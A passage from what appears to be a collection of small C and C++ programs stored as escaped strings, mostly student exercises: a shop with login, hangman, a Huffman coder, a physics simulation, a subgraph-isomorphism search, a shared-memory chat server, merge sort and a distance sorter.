true) << std::endl;\n      return 0;\n    }\n\n    if (option == \"-l\")\n    {\n      std::cout << process(size, true, false) << std::endl;\n      return 0;\n    }\n\n    if (option == \"-n\")\n    {\n      std::cout << process(size, false, true) << std::endl;\n      return 0;\n    }\n\n    throw std::invalid_argument(\"Invalid argument.\");\n  }\n  catch (const std::exception &e)\n  {\n    std::cerr << \"ERROR: \" << e.what() << std::endl;\n    std::cerr << \"USE: spass <-|-l|-n> <SIZE>\" << std::endl;\n    std::cerr << \"EXAMPLE: spass - 16\" << std::endl;\n    return -1;\n  }\n}\n",
    "#include <iostream>\r\n#include <fstream>\r\n#include <string>\r\n#include <windows.h>\r\n#include <cstdlib>\r\n#include <sstream>\r\n#include <vector>\r\n\r\nusing namespace std;\r\n\r\nvector<string> splitString(const string& input, char delimiter) {\r\n        vector<string> result;\r\n        stringstream ss(input);\r\n        string item;\r\n\r\n        while (getline(ss, item, delimiter)) {\r\n            result.push_back(item);\r\n        }\r\n\r\n        return result;\r\n    }\r\n\r\nclass Product\r\n{\r\n    string name;\r\n    int quantity;\r\n    float price;\r\npublic:\r\n    void add_product() {\r\n        string name;\r\n        cout << \"Enter product name: \";\r\n        cin >> name;\r\n        cout << \"Enter product price: \";\r\n        cin >> price;\r\n\r\n        ofstream product_file(\"products.txt\", ios::app);\r\n        product_file << name << \" \" <<  price << endl;\r\n        product_file.close();\r\n\r\n        cout << \"Product added successfully!\" << endl;\r\n    }\r\n\r\n    vector<string> splitString(const string& input, char delimiter) {\r\n        vector<string> result;\r\n        stringstream ss(input);\r\n        string item;\r\n\r\n        while (getline(ss, item, delimiter)) {\r\n            result.push_back(item);\r\n        }\r\n\r\n        return result;\r\n    }\r\n\r\n    void delete_product() {\r\n        string name;\r\n        cout << \"Enter product name to delete: \";\r\n        cin >> name;\r\n\r\n        ifstream product_file(\"products.txt\");\r\n        ofstream temp_file(\"temp.txt\");\r\n\r\n        string line;\r\n        bool found = false;\r\n        while (getline(product_file, line)) {\r\n            vector<string> result = splitString(line, ' ');\r\n            if (result[0] != name) {\r\n                temp_file << line << endl;\r\n            } else {\r\n                found = true;\r\n            }\r\n        }\r\n\r\n        product_file.close();\r\n        temp_file.close();\r\n\r\n        remove(\"products.txt\");\r\n        rename(\"temp.txt\", \"products.txt\");\r\n\r\n        if (found) {\r\n            cout << \"Product deleted successfully!\" << endl;\r\n        } else {\r\n            cout << \"Product not found!\" << endl;\r\n        }\r\n    }\r\n\r\n    void display_products()\r\n    {\r\n        string line;\r\n        ifstream products(\"products.txt\");\r\n\r\n        while(getline(products, line))\r\n        {\r\n            vector<string> result = splitString(line, ' ');\r\n            cout << \"\\n***********************\" << endl;\r\n            cout << \"Name: \" << result[0] << endl;\r\n            cout << \"Price: \" << result[1] << endl;\r\n        }\r\n    }\r\n};\r\n\r\nvoid clearConsole() {\r\n    system(\"cls\");\r\n}\r\n\r\nvoid user_menu(Product product)\r\n{\r\n    cout << \"Happy Shopping!\" << endl;\r\n    while(1)\r\n    {\r\n        string item_name;\r\n        cout << \"\\nEnter item you want to buy: \";\r\n        cin >> item_name;\r\n\r\n        ifstream product_file(\"products.txt\");\r\n        string line;\r\n        bool found = false;\r\n        while (getline(product_file, line)) {\r\n            vector<string> result = splitString(line, ' ');\r\n            if (result[0] == item_name) {\r\n                found = true;\r\n            }\r\n        }\r\n\r\n        ofstream sold_history(\"sold_history.txt\", ios::app);\r\n        if(found){\r\n            clearConsole();\r\n            string cu;\r\n            ifstream product_file(\"products.txt\");\r\n            ifstream current_user(\"current_user.txt\");\r\n            current_user >> cu;\r\n            while (getline(product_file, line)) {\r\n                vector<string> result = splitString(line, ' ');\r\n                if(result[0] == item_name) {\r\n                    sold_history << result[0] << \" \" << result[1] << \" \" << cu << endl;\r\n                    sold_history.close();\r\n                }\r\n            }\r\n            cout << item_name << \" purchased successfully!\" << endl;\r\n            product.display_products();\r\n            continue;\r\n        }\r\n        else{\r\n            cout << \"Invalid Input\" << endl;\r\n            continue;\r\n        }\r\n    }\r\n}\r\n\r\nvoid disableEcho() {\r\n    HANDLE hStdin = GetStdHandle(STD_INPUT_HANDLE);\r\n    DWORD mode;\r\n    GetConsoleMode(hStdin, &mode);\r\n    SetConsoleMode(hStdin, mode & ~ENABLE_ECHO_INPUT);\r\n}\r\n\r\nvoid enableEcho() {\r\n    HANDLE hStdin = GetStdHandle(STD_INPUT_HANDLE);\r\n    DWORD mode;\r\n    GetConsoleMode(hStdin, &mode);\r\n    SetConsoleMode(hStdin, mode | ENABLE_ECHO_INPUT);\r\n}\r\n\r\nvoid user_login(Product product)\r\n{\r\n    string user, password;\r\n\r\n    while(1)\r\n    {\r\n        bool user_is_valid = false, pass_is_valid = false;\r\n        int x = 0, i = 0;\r\n        cout << \"Enter username: \" ;\r\n        cin >> user;\r\n        cout << \"Enter password: \" ;\r\n        disableEcho();\r\n        cin >> password;\r\n        enableEcho();\r\n\r\n        string text;\r\n        ifstream users_file(\"users.txt\");\r\n\r\n        while(getline(users_file, text))\r\n        {\r\n            i++;\r\n            if(text == user)\r\n            {\r\n                user_is_valid = true;\r\n                break;\r\n            }\r\n        }\r\n\r\n        string p_text;\r\n        ifstream user_password_file(\"users_password.txt\");\r\n\r\n        while(getline(user",
    "#include<iostream>\r\n#include<vector>\r\n#include<cstdlib>\r\n#include<ctime>\r\n#include<cctype>\r\n\r\nusing namespace std;\r\n\r\n//Function to select a word from a pool of words\r\nstring listOfWords() {\r\n    vector<string> words = {\"Chivalrous\", \"Breathe\", \"Terrify\", \"Please\", \"Bizarre\", \"Parsimonious\", \"Tense\", \"Please\", \"Accidental\"};\r\n    int n = words.size();\r\n    int word_index = rand() % n;\r\n    return words[word_index];\r\n\r\n}\r\n\r\n//Function to print the hidden word after each try\r\nvoid print(const vector<char>& res, int& tries) {\r\n    for(char ch : res) {\r\n        cout << ch << ' ';\r\n    }\r\n    cout << \"\\t\\tTries: \" << tries <<endl;\r\n    return;\r\n}\r\n\r\nint main() {\r\n    srand(time(0)); //To ensure different words are chosen each time\r\n    string word = listOfWords();\r\n    cout << \"\\tGame Starts\\n\";\r\n    //cout << word << endl;\r\n    vector<char> res;\r\n    for(char ch : word) {\r\n        res.push_back('_');\r\n    }\r\n    int tries = 5, correct = 0;\r\n    print(res, tries);\r\n    bool win = false;\r\n    while(tries > 0) {\r\n        char ch;\r\n        cout <<\"Guess a Character: \";\r\n        cin >> ch;\r\n        int flag = 0;\r\n        if(!isalpha(ch)) {  // To ensure the input is a valid character\r\n            cout << \"Enter a valid Character!\" << endl;\r\n            tries--;\r\n            print(res, tries);\r\n            continue;\r\n        }\r\n        ch = tolower(ch);\r\n        for(int i = 0; i < word.size(); i++) {\r\n            if(tolower(word[i]) == ch && res[i] == '_') {\r\n                flag = 1;\r\n                correct++;\r\n                res[i] = word[i];  // Preserve original case of the word\r\n                break;\r\n            }\r\n        }\r\n        if(flag == 0)   tries--;\r\n        print(res, tries);\r\n        if(correct == word.size()) {//Winning Condition\r\n            win = true;\r\n            break;\r\n        }\r\n    }\r\n    if(win) {\r\n        cout << \"Congratulations! You have guessed the word correctly.\";\r\n    }\r\n    else{\r\n        cout << \"Better luck next time.\";\r\n    }\r\n    return 0;\r\n}\r\n",
    "#include <iostream>\n#include <iomanip>\n#include <cmath>\n#include <vector>\n#include <numeric>\n#include <fstream>\n\n//measured parameters\n//b, d, ip, R, H are in meters\n//M is in kg\ndouble constexpr b = 0.04747;\ndouble constexpr d = 0.064225;\ndouble const ip = std::sqrt(b * b + (2 * d * 2 * d));\ndouble constexpr M = 2.757;\ndouble constexpr R = 0.033907917;\ndouble constexpr H = 0.06987;\nconst char *output_filepath = \"./output/results_correzione_massa_lontana_fc2.txt\";\n\n//to have more or less particles composing the cilinder \n//change these parameters\nint constexpr X_WIDTH_DIVISIONS = 500;\nint constexpr Y_LENGHT_DIVISIONS = 500;\nint constexpr Z_HEIGHT_DIVISIONS = 500;\n\nstruct Vector3\n{\n    double x;\n    double y;\n    double z;\n};\ndouble norm2(Vector3 const &pos)\n{\n    return pos.x * pos.x +\n           pos.y * pos.y +\n           pos.z * pos.z;\n}\n\ndouble norm(Vector3 const &pos)\n{\n    return std::sqrt(norm2(pos));\n}\n\nstruct Particle\n{\n    Vector3 position;\n    double mass;\n};\n\nstruct Body\n{\n    std::vector<Particle> particles;\n};\n\nVector3 operator-(Vector3 const &lhs, Vector3 const &rhs)\n{\n    return Vector3{\n        lhs.x - rhs.x,\n        lhs.y - rhs.y,\n        lhs.z - rhs.z};\n}\n\nVector3 operator/(Vector3 const &lhs, double rhs)\n{\n    return Vector3{\n        lhs.x / rhs,\n        lhs.y / rhs,\n        lhs.z / rhs};\n}\n\nconstexpr int CountParticles()\n{\n    int sum{0};\n    for (double x = -R; x <= +R; x += R / X_WIDTH_DIVISIONS)\n    {\n        for (double y = -R; y <= +R; y += R / Y_LENGHT_DIVISIONS)\n        {\n            for (double z = -H / 2.; z <= +H / 2; z += H / Z_HEIGHT_DIVISIONS)\n            {\n                if (x * x + y * y <= R * R)\n                {\n                    ++sum;\n                }\n            }\n        }\n    }\n    return sum;\n}\n\nint main()\n{\n    std::cout << \"counting particles...\" << std::endl;\n    int number_of_particles{CountParticles()};\n    double mass_of_one_particle{M / number_of_particles};\n\n    std::cout << \"calculating the sum...\" << std::endl;\n    Vector3 posizione_massa_sferica{b, 2 * d, 0.};\n    double sum{0};\n    for (double x = -R; x <= +R; x += R / X_WIDTH_DIVISIONS)\n    {\n        for (double y = -R; y <= +R; y += R / Y_LENGHT_DIVISIONS)\n        {\n            for (double z = -H / 2.; z <= +H / 2; z += H / Z_HEIGHT_DIVISIONS)\n            {\n                if (x * x + y * y <= R * R)\n                {\n                    Particle particle{{x, y, z}, mass_of_one_particle};\n                    Vector3 r{posizione_massa_sferica - particle.position};\n                    Vector3 r_versor = r / norm(r);\n                    sum+=(particle.mass / norm2(r)) * r_versor.x;\n                }\n            }\n        }\n    }\n\n    std::cout << \"finished!\" << std::endl;\n    std::cout << \"number of particles = \" << number_of_particles << '\\n';\n    std::cout << \"fc2 = F2perp/F2perps = \" << std::setprecision(15) << (ip * ip * ip / (b * M)) * sum << '\\n';\n    std::cout << \"the results have also been written in \" << output_filepath << std::endl;\n\n    std::ofstream output{output_filepath, std::ios::out | std::ios::trunc};\n    output << \"x_radius_divisions = \" << X_WIDTH_DIVISIONS << '\\n';\n    output << \"y_radius_divisions = \" << Y_LENGHT_DIVISIONS << '\\n';\n    output << \"z_height_divisions = \" << Z_HEIGHT_DIVISIONS << '\\n';\n    output << \"number of particles = \" << number_of_particles << '\\n';\n    output << \"fc2 = F2perp/F2perps = \" << std::setprecision(15) << (ip * ip * ip / (b * M)) * sum << '\\n';\n}",
    "\ufeff#include<iostream>\n#include<string>\n#include<iomanip>\n#include<algorithm>\n\nusing std::cin;\nusing std::cout;\nusing std::endl;\nusing std::left;\nusing std::setw;\nusing std::string;\nusing std::transform;\n\ntypedef struct HFT {\n\tdouble weight;\n\tint parent, left, right;\n\tstring name;\n}HFT, * PHFT;\n\n//\u9009\u62e9\u6743\u503c\u6700\u5c0f\u7684\u4e24\u4e2a\u7ed3\u70b9\nvoid select(const PHFT& H,const int& n,int& s1,int&s2);\n\n//\u521d\u59cb\u5316\u970d\u592b\u66fc\u7f16\u7801\nvoid initHFM(PHFT& H, const int& n);\n\n//\u8fdb\u884c\u970d\u592b\u66fc\u7f16\u7801\nvoid createHFCode(const PHFT& H, char** HC, const int& n);\n\n//\u663e\u793a\u970d\u592b\u66fc\u6811\nvoid show(const PHFT& H, char** HC, const int& n);\n\n//\u5c06\u7535\u6587\u8f6c\u6362\u4e3a\u970d\u592b\u66fc\u7f16\u7801\nchar** strToHFM(string& str, char** HC);\n\n/*\n* \u5b66\u53f7\uff1a202230481028\n* \u59d3\u540d\uff1a\u9ec4\u94ed\u6d9b\n* \u5b8c\u6210\u65f6\u95f4\uff1a2023.11.21 20:39\n*/\nint main() {\n\tPHFT H;\n\tint n = 0;\n\tcout << \"\u8f93\u5165\u9700\u8981\u7f16\u7801\u7684\u5b57\u6bcd\u6570\u91cf\uff1a\";\n\tcin >> n;\n\t//\u970d\u592b\u66fc\u7f16\u7801\u6570\u7ec4\n\tchar** HC = new char* [n];\n\tinitHFM(H, n);\n\tcreateHFCode(H, HC, n);\n\tshow(H, HC, n);\n\n\tcout << \"\u8f93\u5165\u8981\u970d\u592b\u66fc\u7f16\u7801\u7684\u7535\u6587\uff1a\";\n\tstring str;\n\tcin >> str;\n\tchar** ans;\n\tans = strToHFM(str, HC);\n\tfor (int i = 0; i < str.size(); i++) {\n\t\tcout << ans[i] << \" \";\n\t}\n\n\treturn 0;\n}\n\n\n//\u9009\u62e9\u6743\u503c\u6700\u5c0f\u7684\u4e24\u4e2a\u7ed3\u70b9\nvoid select(const PHFT& H,const int& n,int&s1,int&s2) {\n\t//\u9009\u62e9\u4e00\u4e2a\u6743\u503c\u6700\u5c0f\u7684\u7ed3\u70b9\u7684\u4e0b\u6807\n\tfor (int i = 0; i < n; i++) {\n\t\tif (H[i].parent == 0) {\n\t\t\ts1 = i;\n\t\t\tbreak;\n\t\t}\n\t}\n\tfor (int i = 0; i < n; i++) {\n\t\tif (H[i].parent == 0 && H[s1].weight > H[i].weight) {\n\t\t\ts1 = i;\n\t\t}\n\t}\n\t//\u9009\u62e9\u53e6\u4e00\u4e2a\u6743\u503c\u6700\u5c0f\u7684\u7ed3\u70b9\u7684\u4e0b\u6807\n\tfor (int i = 0; i < n; i++) {\n\t\tif (H[i].parent == 0 && i != s1) {\n\t\t\ts2 = i;\n\t\t\tbreak;\n\t\t}\n\t}\n\tfor (int i = 0; i < n; i++) {\n\t\tif (H[i].parent == 0 && H[s2].weight > H[i].weight && i != s1) {\n\t\t\ts2 = i;\n\t\t}\n\t}\n}\n//\u521d\u59cb\u5316\u970d\u592b\u66fc\u7f16\u7801\nvoid initHFM(PHFT& H, const int& n) {\n\tif (n <= 1) return;\n\n\t//\u521d\u59cb\u5316\u64cd\u4f5c\n\tint m = 2 * n - 1;\n\tH = new HFT[m + 1];\n\tfor (int i = 1; i <= m; i++) {\n\t\tH[i].parent = 0;\n\t\tH[i].left = 0;\n\t\tH[i].right = 0;\n\t}\n\n\t//\u83b7\u53d6\u8981\u7f16\u7801\u7684\u5b57\u6bcd\u548c\u6743\u503c\n\tcout << \"\u8f93\u5165\u7ed3\u70b9\u7684\u521d\u59cb\u6839\u7ed3\u70b9\u7684\u6743\u503c\uff08\u9891\u7387\uff09\u548c\u5927\u5199\u5b57\u6bcd\uff1a\";\n\tfor (int i = 1; i <= n; i++) {\n\t\tcin >> H[i].weight >> H[i].name;\n\t}\n\n\t//\u9009\u62e9\u524d\u4e24\u68f5\u6743\u91cd\u6700\u4f4e\u7684\u6811\u8fdb\u884c\u5408\u5e76\n\tfor (int i = n + 1; i <= m; i++) {\n\t\tint s1, s2;\n\t\tselect(H, i, s1, s2);\n\t\tH[s1].parent = i;\n\t\tH[s2].parent = i;\n\t\tH[i].left = s1;\n\t\tH[i].right = s2;\n\t\tH[i].weight = H[s1].weight + H[s2].weight;\n\t}\n}\n//\u8fdb\u884c\u970d\u592b\u66fc\u7f16\u7801\nvoid createHFCode(const PHFT& H, char** HC, const int& n) {\n\tchar* temp = new char[n];\n\ttemp[n - 1] = '\\0';\n\tint start = 0, cur = 0, father = 0;\n\tfor (int i = 1; i <= n; i++) {\n\t\tstart = n - 1;\n\t\tcur = i;\n\t\tfather = H[cur].parent;\n\t\t//\u5f00\u59cb\u56de\u6eaf\u5230\u6839\u7ed3\u70b9\n\t\twhile (father != 0) {\n\t\t\tif (H[father].left == cur) {\n\t\t\t\ttemp[--start] = '0';\n\t\t\t}\n\t\t\telse {\n\t\t\t\ttemp[--start] = '1';\n\t\t\t}\n\t\t\tcur = father;\n\t\t\tfather = H[cur].parent;\n\t\t}\n\t\tHC[i] = new char[n - start + 1];\n\t\tstrcpy_s(HC[i],n-start+1, &temp[start]);\n\t}\n\n\tdelete[] temp;\n}\n//\u663e\u793a\u970d\u592b\u66fc\u6811\nvoid show(const PHFT& H, char** HC, const int& n) {\n\tcout << \"\u7d22\u5f15  \u6743\u503c  \u7236\u7ed3\u70b9  \u5de6\u7ed3\u70b9  \u53f3\u7ed3\u70b9\" << endl;\n\tcout << left;\n\tint m = 2 * n - 1;\n\tfor (int i = 1; i <= m; i++) {\n\t\tcout << setw(5) << i << \" \";\n\t\tcout << setw(6) << H[i].weight << \" \";\n\t\tcout << setw(6) << H[i].parent << \" \";\n\t\tcout << setw(6) << H[i].left << \" \";\n\t\tcout << setw(6) << H[i].right << \" \" << endl;\n\t}\n\tcout << endl;\n\n\tcout << \"\u5b57\u6bcd  \u970d\u592b\u66fc\u7f16\u7801\" << endl;\n\tfor (int i = 1; i <= n; i++) {\n\t\tcout << setw(5) << H[i].name << \"  \";\n\t\tcout << setw(7) << HC[i] << \" \" << endl;\n\t}\n}\n//\u5c06\u7535\u6587\u8f6c\u6362\u4e3a\u970d\u592b\u66fc\u7f16\u7801\nchar** strToHFM(string& str, char** HC) {\n\t//\u8f6c\u5316\u4e3a\u5927\u5199\n\ttransform(str.begin(), str.end(), str.begin(), ::toupper);\n\n\tchar** ans = new char* [str.size()];\n\n\tfor (int i = 0; i < str.size(); i++) {\n\t\tint index = str[i] - 'A' + 1;\n\t\tint len = strlen(HC[index]);\n\t\tans[i] = new char[len+1];\n\t\tstrcpy_s(ans[i], len+1, HC[index]);\n\t}\n\n\treturn ans;\n}\n",
    "#include<stdio.h>\n#include<stdlib.h>\n#include<limits.h>\n#include<atomic>\n#include<cmath>\n#include<algorithm>\n#include<omp.h>\n#include\"graph.hpp\"\n\nusing namespace std;\n\nbool isFeasible(int u, int v,  graph &pattern, graph &target, vector<int> &mapping, vector<int> &reverseMapping) {\n                           \n                \n    \n    for (int edge = pattern.indexofNodes[u]; edge < pattern.indexofNodes[u+1]; edge ++) \n      {\n        int nbr = pattern.edgeList[edge] ;\n        if(mapping[nbr] != -1){\n        \n        bool found = false;\n        \n        for (int edge1 = target.indexofNodes[v]; edge1 < target.indexofNodes[v+1]; edge1 ++) \n        \n        {\n          int nbr1 = target.edgeList[edge1] ;\n          if(mapping[nbr] == nbr1){\n            found = true;\n            break;\n          }\n        \n        }\n        if(!found){\n          return false;\n        }\n        \n        }\n      \n     }\n     return true;\n}\n\nbool VF2Plus(graph &pattern, graph &target, vector<int> &mapping, vector<int> &reverseMapping, int depth = 0) {\n    if (depth == pattern.num_nodes()) {\n        return true;\n    }\n\n    int u = -1;\n    for (int i = 0; i < pattern.num_nodes(); ++i) {\n        if (mapping[i] == -1) {\n            u = i;\n            break;\n        }\n    }\n\n    if (u == -1) return false;\n\n    bool result = false;\n\n    #pragma omp parallel for shared(result)\n    for (int v = 0; v < target.num_nodes(); ++v) {\n        if (result) \n          continue;\n\n        if (reverseMapping[v] == -1 && isFeasible(u, v, pattern, target, mapping, reverseMapping)) {\n            //#pragma omp critical\n            {\n                if (result) \n                  continue;\n\n                mapping[u] = v;\n                reverseMapping[v] = u;\n\n                if (VF2Plus(pattern, target, mapping, reverseMapping, depth + 1)) {\n                    result = true;\n                }\n\n                mapping[u] = -1;\n                reverseMapping[v] = -1;\n            }\n        }\n    }\n\n    return result;\n}\n\n\n\n\n\n\nbool subgraphIsomorphism( graph &pattern, graph &target) {\n\n    std::vector<int> mapping(pattern.num_nodes(), -1);\n    std::vector<int> reverseMapping(target.num_nodes(), -1);\n    \n\n    return VF2Plus(pattern, target, mapping, reverseMapping);\n}\n \n \n int main()\n{\n\n  graph target(\"/home/ashwina/Subgraph_isomorphism/openmp/input1.txt\");\n  target.parseGraph();\n // printf(\"%d\", target.num_nodes());\n // printf(\"%d\",target.num_edges());\n \n  \n  \n  graph pattern(\"/home/ashwina/Subgraph_isomorphism/openmp/input2.txt\");\n  pattern.parseGraph();\n  \n  //printf(\"%d\", pattern.num_nodes());\n  //printf(\"%d\",pattern.num_edges());\n  \n \n   double startTime = omp_get_wtime();\n    if (subgraphIsomorphism(pattern, target)) {\n        cout << \"subgraph yes\" << endl;\n    } else {\n        cout << \"subgraph no\" << endl;\n    }\n  double endTime = omp_get_wtime();\n  printf(\"EXECUTION TIME %f \\n\", endTime - startTime);\n  return 0;\n\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_adivina_numero\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <cstdlib>\n#include <unistd.h>\n#include <sys/shm.h>\n#include <sys/ipc.h>\n#include <cstring>\n#include <cerrno>\n\nusing namespace std;\n\nconst int max_groups = 10;\nconst int max_group_members = 20;\n\nstruct Server_Control\n{\n    int num_client;\n    int id;\n    int command;\n    bool command_set = false;\n    bool in_group = false;\n    int in_group_id = -1;\n    bool is_usr = true;\n    bool execluded = false; // if true, the client will not be added  to group list or any other issue\n    char chat_history[5000];\n    bool is_admin = false;\n    int admin_id;\n    int current_g = 0;\n    char groupname[10][10]; // max groups=10 max characters per_group\n    bool admin_grants_request = false;\n};\n\nstruct GC_info // group convo info\n{\n    int count = 0;\n    int admin = -1;\n    int id;\n    char group_name[10];\n    int current_members = 0;\n    int members[20];\n};\n\nstruct Group_Join_Request\n{\n    int requester;\n    bool request_entered = false;\n    bool granted = false;\n    char group_name[10];\n    int G_id = -1;\n};\n\nstruct Inbox\n{\n    char Inbox_info[4096]; // 1 to 1 mapping\n    bool inbox_empty = true;\n};\n\nstruct MSG\n{\n    bool written = false;\n    bool recived = false;\n    int to;\n    int from;\n    int mode;\n    char group_name[10];\n    char data[4096];\n};\n\nint main()\n{\n    int num_usr;\n    cout << \"\\nEnter number of users: \";\n    cin >> num_usr;\n\n    int *shmid = new int[num_usr];\n    int *shmid_msg = new int[num_usr];\n    int *shmid_server = new int[num_usr];\n    int *shmid_join = new int[num_usr];\n\n    GC_info *GC = new GC_info[10]; // no need to make shared mem here\n    Inbox **inbox = new Inbox *[num_usr];\n    MSG **msg = new MSG *[num_usr];\n    Server_Control **server = new Server_Control *[num_usr];\n    Group_Join_Request **join = new Group_Join_Request *[num_usr];\n\n    // Creating shared memory segments for each user\n    for (int i = 0; i < num_usr; i++)\n    {\n        shmid[i] = shmget(IPC_PRIVATE, sizeof(struct Inbox), IPC_CREAT | 0666);\n        shmid_msg[i] = shmget(IPC_PRIVATE, sizeof(struct MSG), IPC_CREAT | 0666);\n        shmid_server[i] = shmget(IPC_PRIVATE, sizeof(struct Server_Control), IPC_CREAT | 0666);\n        shmid_join[i] = shmget(IPC_PRIVATE, sizeof(struct Group_Join_Request), IPC_CREAT | 0666);\n\n        if (shmid[i] == -1 || shmid_msg[i] == -1 || shmid_server[i] == -1 || shmid_join[i] == -1)\n        {\n            perror(\"shmget\");\n            exit(EXIT_FAILURE);\n        }\n        inbox[i] = (struct Inbox *)shmat(shmid[i], NULL, 0);\n        msg[i] = (struct MSG *)shmat(shmid_msg[i], NULL, 0);\n        server[i] = (struct Server_Control *)shmat(shmid_server[i], NULL, 0);\n        join[i] = (struct Group_Join_Request *)shmat(shmid_join[i], NULL, 0);\n\n        if (inbox[i] == (void *)-1 || msg[i] == (void *)-1 || server[i] == (void *)-1 || join[i] == (void *)-1)\n        {\n            perror(\"shmat\");\n            exit(EXIT_FAILURE);\n        }\n    }\n    for (int i = 0; i < num_usr; i++)\n    {\n        server[i]->num_client = num_usr;\n        server[i]->id = i;\n    }\n    for (int i = 0; i < 10; i++)\n    {\n        for (int j = 0; j < 20; j++)\n        {\n            GC[i].members[j] = -1;\n        }\n        GC[i].id = i;\n    }\n    cout << \"\\nEstablishing Server......\";\n    cout << \"\\nEstablishing Clients......\";\n    sleep(1);\n    // Forking child processes for each user\n    for (int i = 0; i < num_usr; i++)\n    {\n        int pid = fork();\n        if (pid == 0)\n        {\n            char client_id[5];\n            sprintf(client_id, \"%d\", i + 1);\n            char number[5];\n            char shmid_server1[40]; // for inbox\n            char shmid_msg1[40];\n            char shmid_se[40]; // for server control\n            char shmid_je[40]; // for join request\n            sprintf(number, \"%d\", num_usr);\n            sprintf(shmid_server1, \"%d\", shmid[i]);\n            sprintf(shmid_msg1, \"%d\", shmid_msg[i]);\n            sprintf(shmid_se, \"%d\", shmid_server[i]);\n            sprintf(shmid_je, \"%d\", shmid_join[i]);\n\n            execlp(\"gnome-terminal\", \"gnome-terminal\", \"--\", \"./client\", client_id, number, shmid_server1, shmid_msg1, shmid_se, shmid_je, NULL);\n            perror(\"execlp\");\n            exit(EXIT_FAILURE);\n        }\n        else if (pid < 0)\n        {\n            perror(\"fork\");\n            exit(EXIT_FAILURE);\n        }\n    }\n\n    int current_usr = num_usr;\n    int i = 0;\n\n    while (true)\n    {\n        if (i >= num_usr)\n        {\n            i = 0;\n        }\n        if (server[i]->in_group == true)\n        {\n            server[i]->in_group = false;\n            bool done = false;\n            for (int k = 0; k < 10; k++)\n            {\n                if (GC[k].id == server[i]->admin_id && GC[k].current_members < 19)\n                {\n                    for (int f = 0; f < 20; f++)\n                    {\n                        if (GC[k].members[f] == -1)\n                        {\n                            GC[k].members[f] = server[i]->in_group_id;\n                            strcpy(serve",
    "#include <stdio.h>\r\n#include <stdlib.h>\r\nvoid merge(int arr[], int left, int mid, int right) {\r\n    int i, j, k;\r\n    int n1 = mid - left + 1;\r\n    int n2 = right - mid;\r\n    int* L = (int*)malloc(n1 * sizeof(int));\r\n    int* R = (int*)malloc(n2 * sizeof(int));\r\n    for (i = 0; i < n1; i++) {\r\n        L[i] = arr[left + i];\r\n    }\r\n    for (j = 0; j < n2; j++) {\r\n        R[j] = arr[mid + 1 + j];\r\n    }\r\n    i = 0;\r\n    j = 0;\r\n    k = left;\r\n    while (i < n1 && j < n2) {\r\n        if (L[i] <= R[j]) {\r\n            arr[k] = L[i];\r\n            i++;\r\n        } else {\r\n            arr[k] = R[j];\r\n            j++;\r\n        }\r\n        k++;\r\n    }\r\n    while (i < n1) {\r\n        arr[k] = L[i];\r\n        i++;\r\n        k++;\r\n    }\r\n    while (j < n2) {\r\n        arr[k] = R[j];\r\n        j++;\r\n        k++;\r\n    }\r\n    free(L);\r\n    free(R);\r\n}\r\nvoid mergeSort(int arr[], int left, int right) {\r\n    if (left < right) {\r\n        int mid = left + (right - left) / 2;\r\n        mergeSort(arr, left, mid);\r\n        mergeSort(arr, mid + 1, right);\r\n        merge(arr, left, mid, right);\r\n    }\r\n}\r\nvoid printArray(int arr[], int size) {\r\n    for (int i = 0; i < size; i++) {\r\n        printf(\"%d \", arr[i]);\r\n    }\r\n    printf(\"\\n\");\r\n}\r\nint main() {\r\n    int arr[] = {12, 11, 13, 5, 6, 7};\r\n    int arr_size = sizeof(arr) / sizeof(arr[0]);\r\n    printf(\"Original array: \\n\");\r\n    printArray(arr, arr_size);\r\n    mergeSort(arr, 0, arr_size - 1);\r\n    printf(\"Sorted array: \\n\");\r\n    printArray(arr, arr_size);\r\n    return 0;\r\n}\r\n",
    "#include <iostream>\n#include <string>\n#include <cmath>\n#include <vector>\n#include <algorithm>\nusing namespace std;\n\n// 1 Detik/Test case dan max 64MB\n\nstruct villageCompare{\n    string villageName1;\n    string villageName2;\n    int x0, y0;\n    int x1, y1;\n    int r0, r1;\n    int jarak;\n};\n\nbool compareByDistance(const villageCompare &a, const villageCompare &b) {\n    return a.jarak > b.jarak;\n}\n\nint main(){\n    int p;\n    cin >> p;\n    vector<villageCompare> village(p);\n\n    for(int i = 0; i < p; i++){\n        cin >> village[i].villageName1 >> village[i].x0 >> village[i].y0 >> village[i].r0 >> village[i].villageName2 >> village[i].x1 >> village[i].y1 >> village[i].r1;\n        village[i].jarak = sqrt(pow((village[i].x1 - village[i].x0), 2) + pow((village[i].y1 - village[i].y0), 2));\n    }\n\n    sort(village.begin(), village.end(), compareByDistance);\n\n    for(int i = 0; i < p; i++){\n        cout<<village[i].villageName1<<\" \"<<village[i].villageName2 << \" \" << village[i].jarak<<endl;\n\t}\n    \n\u00a0\u00a0\u00a0\u00a0return\u00a00;\n}\n",
